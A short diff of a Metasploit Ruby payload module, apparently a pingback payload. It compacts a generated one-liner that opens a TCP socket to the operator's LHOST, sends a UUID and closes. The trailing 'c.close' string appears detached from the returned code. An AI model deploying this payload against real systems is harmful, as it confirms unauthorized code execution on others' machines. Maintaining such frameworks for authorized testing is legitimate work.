@@ -36,9 +36,9 @@ module MetasploitModule
     self.pingback_uuid ||= self.generate_pingback_uuid
     lhost = datastore['LHOST']
     lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
-    return "require 'socket';" \
-      "c=TCPSocket.new(\"#{lhost}\", #{datastore['LPORT'].to_i});" \
-      "c.puts(\'#{[[self.pingback_uuid].pack('H*')].pack('m0')}\'.unpack('m0'));"
+    return "require'socket';" \
+      "c=TCPSocket.new'#{lhost}',#{datastore['LPORT'].to_i};" \
+      "c.puts'#{[[self.pingback_uuid].pack('H*')].pack('m0')}'.unpack('m0');"
       "c.close"
   end
 end
